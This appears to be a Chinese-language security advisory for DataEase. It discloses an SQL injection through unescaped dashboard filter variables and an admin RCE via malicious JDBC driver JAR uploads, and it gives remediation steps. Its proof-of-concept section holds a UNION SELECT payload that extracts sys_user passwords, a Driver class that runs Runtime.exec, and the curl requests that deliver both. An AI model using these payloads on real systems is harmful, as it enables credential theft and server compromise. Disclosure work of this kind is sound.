# V-D001: DataEase 数据大屏 SqlVariable transFilter 未过滤 SQL 注入

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | DataEase（人人可用的开源数据可视化分析工具）|
| 版本 | 当前主分支（v2.x 截至 2026-04）|
| 类型 | CWE-89: SQL 注入（数据源维度）|
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（已认证）|
| 代码仓库 | https://github.com/dataease/dataease |

## 漏洞描述

DataEase 允许用户在数据集 SQL 中定义 `${变量名}` 占位符（SqlVariable），仪表板查询时由前端传入 filter 值进行替换。替换逻辑位于 `SqlparserUtils.transFilter()`：

```java
private String transFilter(SqlVariableDetails sqlVariableDetails, ...) {
    if (sqlVariableDetails.getOperator().equals("in")) {
        ...
        return "'" + String.join("','", sqlVariableDetails.getValue()) + "'";
    } else if (...) {
        ...
    } else {
        return (String) sqlVariableDetails.getValue().get(0);  // ← 原样返回用户输入
    }
}
```

最后的 `else` 分支（适用于 `=`、`!=`、`<`、`>`、`like` 等所有非 in/between 算子）**直接返回用户输入**，随后被 `SubstitutedSql.replace("${var}", value)` 拼回 SQL。攻击者可通过控制该 value 注入任意 SQL。

### 触发点

1. 管理员创建 SQL 数据集，定义变量 `${deptId}`
2. 普通用户访问仪表板时通过 POST 请求传入：
   ```json
   {"filters":[{"fieldId":"x","operator":"=","value":"1 UNION SELECT password FROM sys_user--"}]}
   ```
3. `transFilter` 返回原始字符串 → 直接拼入 SQL → 目标数据源执行注入

### 权限要求

- 需要**登录**（任意已认证用户）
- 目标仪表板对当前用户**可见**即可；DataEase 中仪表板可配置为"所有人可见"，此时认证门槛极低

## 漏洞详情

### 受影响数据源

注入发生在数据源维度：
- MySQL / MariaDB
- PostgreSQL
- SQL Server（部分 `in` 分支使用 `N'...'` 转义，但其他算子仍然脆弱）
- Oracle / Kingbase / Doris / ClickHouse（所有接入的数据源均受影响）

### 关联 RCE — JAR 上传 + 自定义 JDBC 驱动

`DatasourceDriverServer.java:123-156` 中，管理员可上传 JDBC 驱动 JAR，DataEase 使用 `URLClassLoader` 加载并 `newInstance()`。结合**驱动初始化代码执行**，已认证管理员可实现 RCE：

```java
URLClassLoader urlClassLoader = new URLClassLoader(...);
Class<?> driverClass = urlClassLoader.loadClass(driverClassName);
Driver driver = (Driver) driverClass.newInstance();  // ← 加载时执行 static 块
```

攻击者上传的恶意 JAR 的 `Driver` 类 static 块中写 `Runtime.exec(...)` 即可直接 RCE。

## 概念验证

### PoC 1: 仪表板变量注入

```bash
# 假设数据集 SQL 为:
# SELECT * FROM orders WHERE dept_id = ${deptId}

curl -X POST -H "X-DE-TOKEN: <token>" -H "Content-Type: application/json" \
  http://<target>/de2api/dataset/query \
  -d '{
    "datasetId": "1",
    "filters": [{
      "fieldId": "deptId",
      "operator": "=",
      "value": ["1 UNION SELECT username,password,null,null FROM sys_user-- -"]
    }]
  }'
```

### PoC 2: 驱动 JAR RCE（已认证管理员）

```java
// 构造恶意 JAR
public class Driver implements java.sql.Driver {
    static {
        try { Runtime.getRuntime().exec("touch /tmp/pwned"); } catch (Exception e) {}
    }
    // 其他接口方法抛异常或空实现
}
```

```bash
# 1) 上传 JAR 作为 JDBC 驱动
curl -X POST -H "X-DE-TOKEN: <admin>" \
  -F "file=@evil.jar" \
  http://<target>/de2api/datasource/driver/upload

# 2) 创建数据源，driverClass = 恶意 Driver 全名
curl -X POST -H "X-DE-TOKEN: <admin>" -H "Content-Type: application/json" \
  http://<target>/de2api/datasource/save \
  -d '{
    "name":"evil",
    "type":"mysql",
    "driver":"com.attacker.Driver",
    "url":"jdbc:mysql://127.0.0.1/test"
  }'
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `core-backend/.../SqlparserUtils.java` | 691-722 | `transFilter()` 返回原始用户输入 |
| `core-backend/.../DatasourceDriverServer.java` | 123-156 | JAR 加载 + `newInstance()` |
| `core-backend/.../SqlVariableService.java` | - | 未对变量 value 做字段类型校验 |

## 影响

1. **数据库完全读取**：UNION 注入或时间盲注提取所有业务数据
2. **跨租户数据泄露**：DataEase 多数据源共用执行器，一次注入可读取所有已接入数据库
3. **写入风险**：若数据库账户权限过高可 DROP 表 / INTO OUTFILE 写 WebShell
4. **链式 RCE**：管理员上传恶意 JDBC JAR 实现服务器 RCE
5. **供应链影响**：DataEase 广泛用于企业 BI，漏洞影响面大

## 修复建议

1. **强类型变量**：SqlVariable 按 `deType` 校验值（数字 → 转 Long；枚举 → 白名单）
2. **参数化替换**：将 `${var}` 改为 JDBC PreparedStatement 占位符 `?`
3. **禁止特殊字符**：value 中包含 `'`、`--`、`/*`、`;` 等一律拒绝
4. **JDBC 驱动白名单**：禁止运行时加载任意 JAR，使用预置驱动列表
5. **签名校验驱动 JAR**：若必须支持上传，要求厂商签名
6. **最小权限**：DataEase 连接各数据源使用只读账户

## 验证环境

- 源代码：DataEase v2.x（静态代码分析）
- 框架：Spring Boot + MyBatis + Calcite SqlParser
- 日期：2026-04-14
